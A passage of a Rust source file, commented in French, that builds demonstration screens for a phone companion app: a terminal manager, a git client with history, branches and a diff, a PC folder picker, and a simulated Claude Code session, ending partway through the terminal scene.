//! Démonstration sans PC (`EYRIE_MOBILE_DEMO=<scène>`), pour les captures et la mise au point de l'interface :
//! `ensemble`, `fawkes`, `recherche`, `terminal`, `patronus`, `depots` (la liste de DragonTree), `depot`, `menu`,
//! `erreur`, `erreur-lue`, `erreur-longue`, `historique`, `branches`, `diff`, `diff-retour`, `plus`, `notes`,
//! `reglages`, `attente`, `injoignable`, `refus`, `accueil`,
//! `commandes`, `accueil-tailscale`, `code`, `appairage`, `hors-ligne`, `lien` (l'écran d'un autre module) ; le
//! sélecteur de dossiers du PC : `dossiers` (un dossier quelconque, une page sur plusieurs), `dossiers-racine`,
//! `dossiers-depot` (un dépôt existant), `dossiers-clone` et `dossiers-clone-pris` (où cloner), `dossiers-erreur`,
//! `dossiers-attente`, `dossiers-silence`, `dossiers-refus` (le PC refuse de lister), `dossiers-texte` (puis le
//! chemin saisi à la main) ; le PC sans Eyrie (voir
//! `veilleur.rs`) : `fermee` (« Démarrer Eyrie »), `fermee-par-pc` (elle vient de se fermer), `fermee-sans-cle`,
//! `fermee-sans-veilleur` (le PC a quitté le tailnet avec elle),
//! `demarrage`, `acces-coupe`, `refus-demarrage`, `preuve-refusee`, `sans-agir` (le téléphone n'a plus « Agir »),
//! `injoignable`, `telephone-hors-ligne` ; le
//! terminal : `terminal-ctrl` (Ctrl collé), `terminal-copie` (le texte à copier), `terminal-coller` (un collage de
//! plusieurs lignes à confirmer), `terminal-coller-echap` (un collage qui cache Échap, à confirmer),
//! `terminal-ctrl-coller` (Ctrl collé, puis Coller : relâché), `terminal-saisie` (sur plusieurs lignes),
//! `terminal-masque` (un mot de passe demandé : la saisie se masque), `terminal-zoom`, `terminal-suivi` (le bas
//! reste en vue quand la liste rapetisse), `terminal-remonte` (la sortie qui arrive ne ramène pas en bas). Suffixe
//! `+clair` ou `+sombre` : le thème (sinon celui du système).

use slint::ComponentHandle;
use suite_mobile::msg::{
    Badge, CommandCard, ENTRY_CLOUD, ENTRY_DENIED, ENTRY_DRIVE, ENTRY_HIDDEN, ENTRY_KNOWN, ENTRY_LINK, ENTRY_REPO,
    FolderEntry, Listing, ModuleCard, Note, PlaceGroup, ToPhone, Waiting,
};
use suite_mobile::term::{self, Color, Line, Run, TermFrame, TermView};
use suite_mobile::ui::{
    Act, Band, Chip, DIFF_ADDED, DIFF_CONTEXT, DIFF_HEADER, DIFF_REMOVED, FOLDER_ANY, FOLDER_PARENT, FOLDER_REPO,
    FolderInput, GRAPH_BOTTOM as B, GRAPH_THROUGH as T, GRAPH_TOP as H, GraphCell, NODE_COMMIT, NODE_HEAD, NODE_MERGE,
    Place, Row, Screen, Tone,
};

use crate::app::with;
use crate::tailnet::Tailnet;
use crate::termkeys::Latch;
use crate::veilleur::{Away, Eyrie, Reach, Start};
use crate::{AppWindow, NoteItem, Theme, UiAct};

/// L'état d'un nœud Tailscale, à l'écran (le bureau n'en a pas).
fn show_tailnet(ui: &AppWindow, t: Tailnet) {
    let (state, text) = t.display();
    ui.set_tailnet_state(state);
    ui.set_tailnet_text(text.into());
}

fn card(id: &str, name: &str, glyph: &str, color: u32, badge: Option<(u32, Tone)>, status: &str) -> ModuleCard {
    ModuleCard {
        id: id.into(),
        name: name.into(),
        glyph: glyph.into(),
        color,
        running: true,
        reason: String::new(),
        badge: badge.map(|(n, tone)| Badge { count: Some(n), tone, tip: String::new() }),
        status: status.into(),
        summary: String::new(),
    }
}

fn modules() -> Vec<ModuleCard> {
    vec![
        card("fawkes", "Fawkes", "🔥", 0xf26d3b, Some((1, Tone::Warn)), "6 terminaux"),
        card("dragontree", "DragonTree", "🌳", 0xe08a5c, None, "Ozmo · main ↑2"),
        card("owlery", "Owlery", "🦉", 0x3aa8d8, Some((3, Tone::Info)), "3 PR à relire"),
        card("patronus", "Patronus", "🦌", 0x9fc5ff, Some((2, Tone::Info)), "1 tâche en cours"),
        card("menagerie", "Menagerie", "🐾", 0x4cb872, None, "4 services"),
        card("grimoire", "Grimoire", "📖", 0xb07ce0, None, "2 profils"),
        card("gringotts", "Gringotts", "🏦", 0xe8b84a, None, "5 h 38 % · 7 j 61 %"),
        card("carnet", "Carnet", "🗒", 0x8a919d, None, ""),
    ]
}

/// Le menu d'un groupe de Fawkes.
fn group_menu(g: &str) -> Band {
    Band::new(g, "")
        .act(Act::new(format!("claude:{g}"), "Claude dans le dépôt du groupe").glyph("✳"))
        .act(Act::screen("Nouveau terminal dans ce groupe…", format!("nouveau/g/{g}")).glyph("+"))
        .act(Act::new(format!("veille:{g}"), "Tout mettre en veille").glyph("☾"))
        .act(
            Act::new(format!("redemarrer:{g}"), "Tout redémarrer")
                .glyph("↻")
                .danger()
                .confirm("Redémarrer tous les terminaux du groupe ?"),
        )
}

/// Fawkes : un bandeau pliant par groupe de terminaux.
fn fawkes_home() -> Screen {
    let mut s = Screen::new("Fawkes").act(Act::new("@pc", "Montrer sur le PC")).search("Chercher un terminal");
    s.note("Une session Claude attend une réponse.", Tone::Warn);
    s.row(Row::new("Nouveau terminal").glyph("➕").subtitle("Shell ou Claude, dans un dossier récent").open("nouveau"));
    let eyrie = group_menu("g1");
    s.band(
        Band { title: "Eyrie".into(), aside: "✳️1 · 3".into(), ..eyrie }
            .color(0x5b8def)
            .badge("1 attend")
            .tone(Tone::Warn),
    );
    s.row(
        Row::new("Claude · appli mobile")
            .subtitle("Claude attend une réponse · …\\TestAubin\\Eyrie")
            .glyph("✳️")
            .color(0x5b8def)
            .tone(Tone::Warn)
            .badge("attend")
            .open("t/3")
            .act(Act::new("redemarrer:3", "Redémarrer").glyph("🔄")),
    );
    s.row(
        Row::new("cargo test")
            .subtitle("Commande en cours · …\\TestAubin\\Eyrie")
            .glyph("›_")
            .color(0x5b8def)
            .detail("cargo")
            .open("t/4")
            .act(Act::new("veille:4", "Mettre en veille").glyph("🌙")),
    );
    s.row(Row::new("PowerShell").subtitle("Shell · …\\TestAubin\\Eyrie").glyph("›_").color(0x5b8def).open("t/5"));
    let ozmo = group_menu("g2");
    s.band(Band { title: "Ozmo".into(), aside: "✳️1 · 2".into(), ..ozmo }.color(0x4cb872));
    s.row(
        Row::new("Claude · revue de code")
            .subtitle("Claude travaille · …\\DEV\\Ozmo")
            .glyph("✳️")
            .color(0x4cb872)
            .tone(Tone::Ok)
            .open("t/6"),
    );
    s.row(Row::new("Git Bash").subtitle("En veille · …\\DEV\\Ozmo").glyph("›_").color(0x4cb872).open("t/7"));
    let perso = group_menu("g3");
    s.band(Band { title: "Perso".into(), aside: "0".into(), ..perso }.color(0xb07ce0).open(false));
    s.empty("Aucun terminal dans ce groupe.");
    s
}

fn patronus_home() -> Screen {
    let mut s = Screen::new("Patronus").subtitle("1 tâche en cours").act(Act::new("tout", "Tout arrêter").danger());
    s.meter("Budget du mois", 0.42, "8,40 € / 20 €", Tone::Ok);
    s.section("Tâches", "3");
    s.row(
        Row::new("Revue des PR du matin")
            .subtitle("Chaque jour à 8 h · prochaine demain 8:00")
            .glyph("🦌")
            .tone(Tone::Ok)
            .detail("réussie")
            .open("tache/revue")
            .trailing(Act::new("lancer:revue", "Lancer").glyph("▶").primary())
            .act(Act::new("consigne:revue", "Lancer avec une consigne…").input("Consigne", "")),
    );
    s.row(
        Row::new("Mise à jour des dépendances")
            .subtitle("En cours depuis 4 min")
            .glyph("🔄")
            .tone(Tone::Info)
            .badge("en cours")
            .progress(None)
            .open("tache/deps")
            .act(Act::new("arreter:deps", "Arrêter").glyph("⏹️").danger()),
    );
    s.row(
        Row::new("Nettoyage des branches")
            .subtitle("Le lundi à 9 h")
            .glyph("🧹")
            .tap(Act::new("lancer:menage", "Lancer").glyph("▶")),
    );
    s.section("Boîte de réception", "2 non lus");
    s.row(Row::new("Revue des PR du matin").subtitle("Réussie · 0,42 €").detail("8:03").glyph("●").open("run/41"));
    s.row(
        Row::new("Tests de nuit")
            .subtitle("Échec : 2 tests rouges")
            .detail("hier")
            .glyph("●")
            .tone(Tone::Danger)
            .open("run/40"),
    );
    s
}

/// Une erreur de git telle que le PC la rend.
const PUSH_REFUSED: &str = concat!(
    "Push refusé : ! [rejected] mobile-ergonomie -> mobile-ergonomie (fetch first). error: failed to push some refs ",
    "to 'https://dev.azure.com/xelya/Eyrie/_git/Eyrie'. hint: Updates were rejected because the remote contains work ",
    "that you do not have locally. This is usually caused by another repository pushing to the same ref. hint: You ",
    "may want to first integrate the remote changes (e.g., 'git pull ...') before pushing again."
);

/// Les quatre onglets d'un dépôt de DragonTree (`depot::with_tabs`).
fn tabs(s: Screen) -> Screen {
    s.tab("État", "depot/eyrie")
        .tab("Historique", "depot/eyrie/historique")
        .tab("Branches", "depot/eyrie/branches")
        .tab("Plus", "depot/eyrie/plus")
}

/// Un dépôt de DragonTree, avec ses onglets.
fn depot(title: &str) -> Screen {
    let s = Screen::new(title)
        .subtitle("mobile-ergonomie · ↑2 ↓1")
        .act(Act::new("@pc", "Montrer sur le PC"))
        .act(Act::new("actualiser", "Actualiser").glyph("🔄"))
        .act(Act::new("terminal", "Terminal dans ce dépôt").glyph("›_"))
        .act(Act::new("explorer", "Ouvrir dans l'explorateur"))
        .act(
            Act::new("retirer", "Retirer de DragonTree")
                .glyph("×")
                .danger()
                .confirm("Retirer ce dépôt de DragonTree ?"),
        );
    tabs(s)
}

/// Un dépôt de DragonTree, onglet État : l'opération en cours, les gestes, les modifications.
fn depot_state() -> Screen {
    let mut s = depot("Eyrie");
    s.progress("Pull depuis origin… 42 %", Some(42), Some(Act::new("annuler", "Annuler").glyph("×")));
    s.buttons(vec![
        Act::new("fetch", "Fetch").glyph("↓"),
        Act::new("pull", "Pull (fusion)").glyph("↓"),
        Act::new("pull-rebase", "Pull (rebase)").glyph("↓"),
        Act::new("push", "Push").glyph("↑").primary(),
        Act::new("push-force", "Push forcé").glyph("↑").danger().confirm("Pousser en forçant (avec bail) ?"),
    ]);
    s.section("Modifications", "3");
    s.row(
        Row::new("crates/eyrie-mobile/src/view.rs")
            .subtitle("modifié")
            .glyph("M")
            .key("f/view")
            .open("depot/eyrie/fichier/view"),
    );
    s.row(
        Row::new("crates/eyrie-mobile/ui/pages.slint")
            .subtitle("modifié")
            .glyph("M")
            .key("f/pages")
            .open("depot/eyrie/fichier/pages"),
    );
    s.row(Row::new("lib.rs").subtitle("nouveau").glyph("?").key("f/lib").open("depot/eyrie/fichier/lib"));
    s
}

/// Un commit de l'historique de démonstration, comme DragonTree l'envoie (`historique::commit_row`) : sa voie (et sa
/// couleur), sa sorte de nœud, ses traits.
fn commit(title: &str, sha: &str, hours: u8, lane: u8, kind: u8, lines: Vec<(u8, u8, u8, u8)>) -> Row {
    Row::new(title)
        .key(sha)
        .subtitle(format!("Aubin Chedotal · il y a {hours} h"))
        .detail(sha)
        .graph(GraphCell { lanes: 2, node: lane, color: lane, kind, lines })
        .open(format!("depot/eyrie/commit/{sha}"))
        .act(Act::new(format!("cherry-pick:{sha}"), "Cherry-pick").glyph("⇢"))
        .act(Act::new(format!("revert:{sha}"), "Revert").glyph("↶"))
}

/// L'historique d'un dépôt : le graphe de DragonTree (une branche fusionnée), les étiquettes, une recherche.
fn depot_history() -> Screen {
    let mut s = depot("Eyrie").search("Chercher un commit");
    s.buttons(vec![Act::new("toutes", "Toutes les branches")]);
    // Les étiquettes de DragonTree (`historique::chips`) : glyphe, ton, la branche courante mise en avant.
    let remote = |name: &str| Chip::new(name).glyph("🌐").tone(Tone::Info);
    s.row(
        commit("Téléphone : bandeaux pliants", "75b78ee", 1, 0, NODE_HEAD, vec![(B, 0, 0, 0)])
            .chip(Chip::new("mobile-ergonomie").glyph("🌿").tone(Tone::Ok).strong())
            .chip(remote("origin/mobile-ergonomie"))
            .chip(Chip::new("v1.0-rc1").glyph("🏷️")),
    );
    let both = vec![(H, 0, 0, 0), (B, 0, 0, 0)];
    s.row(commit("Téléphone : une action en cours se voit", "a31b4d7", 2, 0, NODE_COMMIT, both.clone()));
    let merge = vec![(H, 0, 0, 0), (B, 0, 0, 0), (B, 0, 1, 1)];
    s.row(commit("Fusion de « graphe » dans mobile-ergonomie", "f2bb5e0", 3, 0, NODE_MERGE, merge).badge("+2"));
    let side = vec![(T, 0, 0, 0), (H, 1, 1, 1), (B, 1, 1, 1)];
    s.row(
        commit("Graphe : les traits se raccordent", "9b082a2", 4, 1, NODE_COMMIT, side.clone())
            .chip(remote("origin/graphe")),
    );
    s.row(commit("Graphe : palette de DragonTree", "5431a15", 5, 1, NODE_COMMIT, side));
    let fork = vec![(H, 0, 0, 0), (H, 1, 0, 1), (B, 0, 0, 0)];
    s.row(
        commit("Docs : conception de la passe d'ergonomie", "5c1b48d", 6, 0, NODE_COMMIT, fork)
            .chip(Chip::new("v0.9").glyph("🏷️"))
            .chip(remote("origin/main")),
    );
    s.row(commit("Protocole mobile : bandeaux, onglets, graphe", "f4b1c15", 7, 0, NODE_COMMIT, both));
    s.row(commit("Docs : pas de service au premier plan", "87c3363", 8, 0, NODE_COMMIT, vec![(H, 0, 0, 0)]));
    s
}

/// Un fichier modifié : son diff, numéroté.
fn depot_file() -> Screen {
    let mut s = Screen::new("view.rs").subtitle("crates/eyrie-mobile/src · modifié");
    s.buttons(vec![
        Act::new("indexer:view", "Indexer").glyph("+").primary(),
        Act::new("annuler:view", "Annuler").danger(),
    ]);
    let lines = [
        (DIFF_HEADER, "@@ -98,7 +98,9 @@ pub fn items<'a>(s: &'a Screen, local: &Local) -> Vec<Item<'a>> {"),
        (DIFF_CONTEXT, "    let needle = plain(local.search.trim());"),
        (DIFF_CONTEXT, "    let visible = visible(s, local, &needle);"),
        (DIFF_REMOVED, "    let is_row = |i: usize| matches!(s.blocks.get(i), Some(Block::Row(_)));"),
        (DIFF_ADDED, "    let is_row = |i: usize| matches!(visible.get(i), Some((Block::Row(_), _)));"),
        (DIFF_ADDED, "    // Les cartes se forment sur ce qui est montré."),
        (DIFF_CONTEXT, "    let mut keys = Keys::default();"),
    ];
    let numbers = vec![(0, 0), (98, 98), (99, 99), (100, 0), (0, 100), (0, 101), (101, 102)];
    s.diff_numbered(lines.iter().map(|&(k, t)| (k, t.to_string())).collect(), numbers);
    s
}

/// Le dossier de développement du PC de démonstration.
const DEV: &str = r"C:\Users\aubin\DEV";

/// Les raccourcis que DragonTree donne au sélecteur.
fn dragontree_places() -> Vec<Place> {
    vec![
        Place { label: "Dossier de clonage".into(), path: DEV.into(), glyph: "📥".into() },
        Place { label: "Dossier analysé : TestAubin".into(), path: format!(r"{DEV}\TestAubin"), glyph: "📁".into() },
    ]
}

/// « Ajouter un dépôt existant… » : un dépôt du PC, choisi dans le sélecteur.
fn add_act() -> Act {
    let known = vec![format!(r"{DEV}\TestAubin\Eyrie"), format!(r"{DEV}\Ozmo")];
    let spec = FolderInput { want: FOLDER_REPO, places: dragontree_places(), known, ..Default::default() };
    Act::new("ajouter", "Ajouter un dépôt existant…")
        .glyph("➕")
        .input("Dépôt à ajouter", r"C:\…\mon-depot")
        .folder("Dépôt à ajouter", spec)
}

/// « Cloner » : le dossier où créer le clone, confirmé une fois choisi.
fn clone_act() -> Act {
    let spec = FolderInput {
        want: FOLDER_PARENT,
        start: DEV.into(),
        child: "Ozmo".into(),
        places: dragontree_places(),
        ..Default::default()
    };
    Act::new("cloner", "Cloner Ozmo…")
        .glyph("⬇")
        .confirm("Cloner Ozmo dans ce dossier ?")
        .input("Où cloner Ozmo", r"C:\…")
        .folder("Où cloner Ozmo", spec)
}

/// Un dépôt de la liste, comme DragonTree l'envoie (`liste::row_of`) : son état rapide et son ton, ses gestes.
fn repo(title: &str, key: &str, state: &str, tone: Tone) -> Row {
    Row::new(title)
        .key(key)
        .glyph("🌿")
        .open(format!("depot/{key}"))
        .subtitle(state)
        .tone(tone)
        .act(Act::new(format!("fetch:{key}"), "Fetch").glyph("⬇️"))
        .act(Act::new(format!("pull:{key}"), "Pull").glyph("↓"))
        .act(
            Act::new(format!("push:{key}"), "Push")
                .glyph("↑")
                .confirm("Pousser la branche courante vers sa branche distante ?"),
        )
        .act(Act::new(format!("pc:{key}"), "Afficher dans DragonTree sur le PC").glyph("🖥️"))
}

/// La liste des dépôts de DragonTree (`liste::home`) : ouverts sur le PC, épinglés, un bandeau par dossier analysé
/// (plié au-delà de quinze dépôts), les récents ; un Fetch tout juste fini, un Pull en cours ; les deux actions qui
/// demandent un dossier du PC.
fn dragontree_home() -> Screen {
    let mut s = Screen::new("DragonTree")
        .search("Chercher un dépôt")
        .act(add_act())
        .act(clone_act())
        .act(Act::new("actualiser", "Actualiser").glyph("🔄"));
    s.note("Ozmo · DEV : Fetch terminé", Tone::Ok);
    s.band(Band::new("ouverts", "Ouverts sur le PC").glyph("🖥️").aside("2"));
    let eyrie = repo("Eyrie", "eyrie", "mobile-ergonomie · ↑2 ↓1 · 3 modifications", Tone::Warn);
    s.row(eyrie.color(0x5b8def).badge("affiché"));
    s.row(repo("Ozmo · DEV", "ozmo", "main · ↑2 · propre", Tone::Ok).color(0x4cb872));
    s.band(Band::new("epingles", "Épinglés").glyph("📌").aside("1"));
    let dragontree = repo("DragonTree", "dragontree", "suite/mobile-ergonomie · ↓4 · propre", Tone::Warn);
    s.row(dragontree.badge("en cours").progress(Some(35)));
    s.band(Band::new("racine/5e0c1a", "TestAubin").glyph("📁").aside("4"));
    s.row(repo("Fawkes", "fawkes", "suite/mobile-ergonomie · propre", Tone::Ok));
    s.row(repo("Owlery", "owlery", "main · ↑1 · 1 modification", Tone::Warn));
    s.row(repo("Menagerie", "menagerie", "HEAD détachée · propre", Tone::Ok));
    s.row(repo("Grimoire", "grimoire", "Dépôt illisible : .git/HEAD manquant", Tone::Danger));
    s.band(Band::new("racine/a41f07", "Clients").glyph("📁").aside("23").open(false));
    s.row(repo("Ozmo · Clients", "ozmo-clients", "main · propre", Tone::Ok));
    s.band(Band::new("recents", "Récents").glyph("🕘").aside("1"));
    s.row(repo("Ballon", "ballon", "main · ↓2 · propre", Tone::Warn));
    s
}

/// Une branche locale de l'onglet Branches, comme DragonTree l'envoie (`branches::branch_row`) : elle ouvre son
/// détail, ses gestes au menu.
fn branch(name: &str, key: &str, sub: &str) -> Row {
    let current = "mobile-ergonomie";
    Row::new(name)
        .key(key)
        .glyph("🌿")
        .subtitle(sub)
        .open(format!("depot/eyrie/branche/{key}"))
        .act(Act::new(format!("basculer:{name}"), "Basculer").glyph("↪️").confirm(format!("Basculer sur {name} ?")))
        .act(
            Act::new(format!("fusionner:{name}"), format!("Fusionner dans {current}"))
                .glyph("🔀")
                .confirm(format!("Fusionner {name} dans {current} ?")),
        )
        .act(Act::new(format!("renommer:{name}"), "Renommer…").glyph("✏️").input("Nouveau nom", "").input_value(name))
        .act(
            Act::new(format!("supprimer-branche:{name}"), "Supprimer")
                .glyph("🗑️")
                .danger()
                .confirm(format!("Supprimer la branche {name} ? (refusé si elle n'est pas fusionnée)")),
        )
}

/// L'onglet Branches d'un dépôt (`branches::list`) : la courante, les locales les plus récentes d'abord, puis les
/// distantes, pliées, par remote.
fn depot_branches() -> Screen {
    let mut s = tabs(Screen::new("Branches"))
        .subtitle("Courante : mobile-ergonomie · 6 locale(s), 9 distante(s)")
        .search("Chercher une branche")
        .act(
            Act::new("nouvelle-branche", "Nouvelle branche…")
                .glyph("🌿")
                .input("Nom (créée depuis HEAD et sortie)", "feature/…"),
        );
    s.band(Band::new("courante", "Courante").glyph("📍"));
    s.row(
        Row::new("mobile-ergonomie")
            .key("c0ffee")
            .glyph("🌿")
            .badge("courante")
            .tone(Tone::Ok)
            .subtitle("origin/mobile-ergonomie · ↑2 ↓1 · il y a 1 h")
            .open("depot/eyrie/branche/c0ffee")
            .act(
                Act::new("push", "Pousser")
                    .glyph("⬆️")
                    .confirm("Pousser mobile-ergonomie vers origin/mobile-ergonomie ?"),
            ),
    );
    s.band(Band::new("g:1b2c3d", "Locales").glyph("🌿").aside("5"));
    s.row(branch("main", "a1b2c3", "origin/main · à jour · il y a 2 j"));
    s.row(branch("graphe", "d4e5f6", "origin/graphe (supprimée sur le serveur) · il y a 3 h"));
    s.row(branch("feature/qr-code", "0a1b2c", "non publiée · il y a 5 h"));
    s.row(branch("correctif-veille", "3d4e5f", "origin/correctif-veille · ↑1 ↓3 · il y a 1 j").tone(Tone::Warn));
    s.row(branch("essai-slint-1.18", "6a7b8c", "non publiée · il y a 6 j"));
    s.band(Band::new("g:9e8d7c", "origin").glyph("🌐").aside("7").open(false));
    let remote = |name: &str, key: &str, sub: &str| {
        Row::new(name).key(key).glyph("🌐").subtitle(sub).open(format!("depot/eyrie/branche/{key}"))
    };
    s.row(remote("origin/mobile-ergonomie", "e1e2e3", "suivie par mobile-ergonomie · il y a 3 h"));
    s.row(remote("origin/main", "f1f2f3", "suivie par main · il y a 2 j"));
    s.band(Band::new("g:4f5e6d", "upstream").glyph("🌐").aside("2").open(false));
    s.row(remote("upstream/main", "a9b8c7", "il y a 4 j"));
    s
}

/// L'écran « Nouveau terminal » de Fawkes : « Autre dossier… » ouvre le sélecteur (un dossier quelconque).
fn fawkes_new() -> Screen {
    let spec = FolderInput {
        want: FOLDER_ANY,
        places: vec![Place { label: "Eyrie".into(), path: format!(r"{DEV}\TestAubin\Eyrie"), glyph: "📁".into() }],
        ..Default::default()
    };
    let pick = Act::new("shell:saisi", "Ouvrir un shell")
        .glyph("›_")
        .input("Dossier sur le PC", r"C:\Users\…\projet")
        .folder("Dossier sur le PC", spec);
    let mut s = Screen::new("Nouveau terminal");
    s.section("Ailleurs", "");
    s.row(Row::new("Autre dossier…").key("autre").subtitle("Choisir un dossier du PC").glyph("📂").tap(pick));
    s
}

fn folder(name: &str, parent: &str, flags: u8, detail: &str) -> FolderEntry {
    FolderEntry { name: name.into(), path: format!(r"{parent}\{name}"), flags, detail: detail.into() }
}

/// Le fil d'Ariane de `dir` (sous `C:`).
fn crumbs(dir: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut path = String::new();
    for part in dir.split('\\').filter(|p| !p.is_empty()) {
        path = if path.is_empty() { format!(r"{part}\") } else { format!(r"{}\{part}", path.trim_end_matches('\\')) };
        out.push((part.to_string(), path.clone()));
    }
    out
}

/// La racine du sélecteur : les raccourcis du PC, par groupe.
fn root_listing() -> Listing {
    let drive = |name: &str, detail: &str| FolderEntry {
        name: name.into(),
        path: format!(r"{name}\"),
        flags: ENTRY_DRIVE,
        detail: detail.into(),
    };
    Listing {
        title: "Ce PC".into(),
        groups: vec![
            PlaceGroup {
                title: "Récents".into(),
                places: vec![folder("Ozmo2", DEV, ENTRY_REPO, ""), folder("TestAubin", DEV, 0, "")],
            },
            PlaceGroup {
                title: "Accès rapide".into(),
                places: vec![
                    folder("aubin", r"C:\Users", 0, "Dossier personnel"),
                    folder("Documents", r"C:\Users\aubin", ENTRY_CLOUD, "OneDrive"),
                    folder("DEV", r"C:\Users\aubin", 0, ""),
                ],
            },
            PlaceGroup {
                title: "Lecteurs".into(),
                places: vec![drive("C:", "Windows · 212 Go libres"), drive("D:", "Données · 1,4 To libres")],
            },
        ],
        ..Default::default()
    }
}

/// Le dossier de développement : des dépôts (dont ceux que DragonTree a déjà), un lien OneDrive, un dossier refusé.
fn dev_listing(choose: Option<&str>, why_not: &str) -> Listing {
    let entries = vec![
        folder("Archives", DEV, 0, ""),
        folder("DragonTree", DEV, ENTRY_REPO, ""),
        folder("Fawkes", DEV, ENTRY_REPO, ""),
        folder("Notes", DEV, ENTRY_LINK | ENTRY_CLOUD, ""),
        folder("Ozmo", DEV, ENTRY_REPO | ENTRY_KNOWN, "déjà dans DragonTree"),
        folder("Ozmo2", DEV, ENTRY_REPO, ""),
        folder("Partage équipe", DEV, ENTRY_DENIED, ""),
        folder("TestAubin", DEV, 0, "3 dépôts"),
    ];
    Listing {
        dir: DEV.into(),
        title: "DEV".into(),
        crumbs: crumbs(DEV),
        total: entries.len() as u32,
        entries,
        hidden: 2,
        files: 4,
        choose: choose.map(String::from),
        why_not: why_not.into(),
        ..Default::default()
    }
}

/// La démonstration du sélecteur de dossiers : l'écran du module, l'action touchée, puis ce que répond le PC.
fn folders(scene: &str, feed: &dyn Fn(ToPhone)) {
    feed(ToPhone::Screen { module: "fawkes".into(), path: "nouveau".into(), screen: fawkes_new() });
    let answer = |l: Listing| {
        with(|c| c.demo_folder(Some(l)));
    };
    let open = |module: &str, path: &str, act: &Act| {
        with(|c| {
            c.open_module_path(module, path);
            c.open_folder(&crate::view::act(act));
        });
    };
    match scene {
        // Un dossier quelconque (un nouveau terminal) : une page de plus de quarante dossiers, le filtre.
        "dossiers" => {
            open("fawkes", "nouveau", &fawkes_new_act().expect("« Autre dossier… »"));
            // La première page tient à l'écran, avec « N de plus » et les dossiers cachés.
            let names = ["Archives", "Clients", "DragonTree", "Eyrie-docs", "Fawkes", "Formation", "Notes", "Owlery"];
            let entries: Vec<FolderEntry> = names
                .iter()
                .map(|n| {
                    let flags = if ["DragonTree", "Fawkes", "Owlery"].contains(n) {
                        ENTRY_REPO
                    } else if *n == "Notes" {
                        ENTRY_LINK
                    } else {
                        0
                    };
                    folder(n, DEV, flags, "")
                })
                .collect();
            answer(Listing {
                dir: DEV.into(),
                title: "DEV".into(),
                crumbs: crumbs(DEV),
                total: 64,
                more: true,
                entries,
                hidden: 3,
                choose: Some("Ouvrir un shell ici".into()),
                ..Default::default()
            });
        }
        "dossiers-racine" => {
            open("dragontree", "", &add_act());
            answer(root_listing());
        }
        // Un dépôt existant : « Choisir » à côté de chaque dépôt ; le dossier montré n'en est pas un.
        "dossiers-depot" => {
            open("dragontree", "", &add_act());
            answer(root_listing());
            with(|c| c.picker_go(DEV));
            answer(dev_listing(None, "Ce dossier n'est pas un dépôt git : ouvrez un dépôt, ou touchez « Choisir »."));
            // L'écran suivi, renvoyé par le PC pendant le choix : le sélecteur reste ouvert.
            feed(ToPhone::Screen { module: "dragontree".into(), path: String::new(), screen: dragontree_home() });
        }
        // Où cloner : le dossier de clonage, et ce que donnera le choix.
        "dossiers-clone" | "dossiers-clone-pris" => {
            open("dragontree", "", &clone_act());
            let mut l = dev_listing(Some("Cloner ici"), "");
            if scene == "dossiers-clone" {
                l.target = format!(r"{DEV}\Ozmo : sera créé");
                l.target_tone = Tone::Ok;
            } else {
                l.choose = None;
                l.target = format!(r"{DEV}\Ozmo existe déjà et n'est pas vide : choisissez un autre dossier.");
                l.target_tone = Tone::Danger;
            }
            answer(l);
        }
        // La racine de C:, des dossiers refusés, puis un dossier protégé : le PC le dit, le dossier montré reste.
        "dossiers-erreur" => {
            open("dragontree", "", &add_act());
            answer(root_listing());
            with(|c| c.picker_go(r"C:\"));
            let c = r"C:";
            let protected = "zone protégée";
            answer(Listing {
                dir: r"C:\".into(),
                title: "C:".into(),
                crumbs: crumbs(r"C:\"),
                entries: vec![
                    folder("$Recycle.Bin", c, ENTRY_HIDDEN | ENTRY_DENIED, ""),
                    folder("Program Files", c, ENTRY_DENIED, protected),
                    folder("ProgramData", c, ENTRY_DENIED | ENTRY_HIDDEN, protected),
                    folder("Users", c, 0, ""),
                    folder("Windows", c, ENTRY_DENIED, protected),
                ],
                total: 5,
                why_not: "Ce dossier n'est pas un dépôt git.".into(),
                ..Default::default()
            });
            // Comme le pont : le chemin demandé, la seule racine dans le fil, et l'erreur.
            with(|c| c.picker_go(r"C:\Users\aubin\AppData"));
            answer(Listing {
                dir: r"C:\Users\aubin\AppData".into(),
                title: "AppData".into(),
                crumbs: vec![("Ce PC".into(), String::new())],
                error: r"C:\Users\aubin\AppData : zone protégée, elle ne se parcourt pas depuis le téléphone.".into(),
                ..Default::default()
            });
        }
        "dossiers-attente" => open("dragontree", "", &add_act()),
        "dossiers-silence" => {
            open("dragontree", "", &add_act());
            with(|c| c.demo_folder(None));
        }
        // Le PC refuse de lister (le droit « Dossiers du PC » coupé depuis l'accueil) : son refus, « Réessayer », et le
        // chemin à saisir à la main ; puis le champ de texte.
        "dossiers-refus" | "dossiers-texte" => {
            open("dragontree", "", &add_act());
            answer(Listing {
                error: "Ce téléphone n'a pas le droit de parcourir les dossiers du PC (réglage du PC).".into(),
                ..Default::default()
            });
            if scene == "dossiers-texte" {
                with(|c| c.picker_choose());
            }
        }
        _ => {}
    }
}

/// L'action « Autre dossier… » de l'écran « Nouveau terminal » de Fawkes.
fn fawkes_new_act() -> Option<Act> {
    fawkes_new().blocks.into_iter().find_map(|b| match b {
        suite_mobile::ui::Block::Row(r) => r.tap,
        _ => None,
    })
}

fn run(col: u16, text: &str, fg: Color, flags: u8) -> Run {
    Run { col, text: text.into(), fg, bg: Color::Default, flags }
}

fn terminal() -> TermView {
    let dim = Color::Indexed(8);
    let mut lines = vec![
        Line {
            runs: vec![run(0, "╭─────────────────────────────────────────────────╮", dim, 0)]
        },
        Line { runs: vec![run(0, "│ ✻ Welcome to Claude Code!                       │", Color::Indexed(13), 0)] },
        Line {
            runs: vec![run(0, "╰─────────────────────────────────────────────────╯", dim, 0)]
        },
        Line::default(),
        Line { runs: vec![run(0, "> ajoute le lecteur de QR code à l'application", Color::Default, term::BOLD)] },
        Line::default(),
        Line {
            runs: vec![
                run(0, "● ", Color::Indexed(2), 0),
                run(2, "Je lis crates/eyrie-mobile/src/platform.rs.", Color::Default, 0),
            ],
        },
        Line::default(),
        Line {
            runs: vec![
                run(0, "● ", Color::Indexed(2), 0),
                run(2, "Update(crates/eyrie-mobile/src/android.rs)", Color::Default, term::BOLD),
            ],
        },
        Line { runs: vec![run(2, "⎿  Ajout de 142 lignes", dim, 0)] },
        Line { runs: vec![run(4, "+ pub fn start_scan(on_frame: …, on_code: …) {", Color::Indexed(2), 0)] },
        Line { runs: vec![run(4, "+     let camera = Camera::open_back()?;", Color::Indexed(2), 0)] },
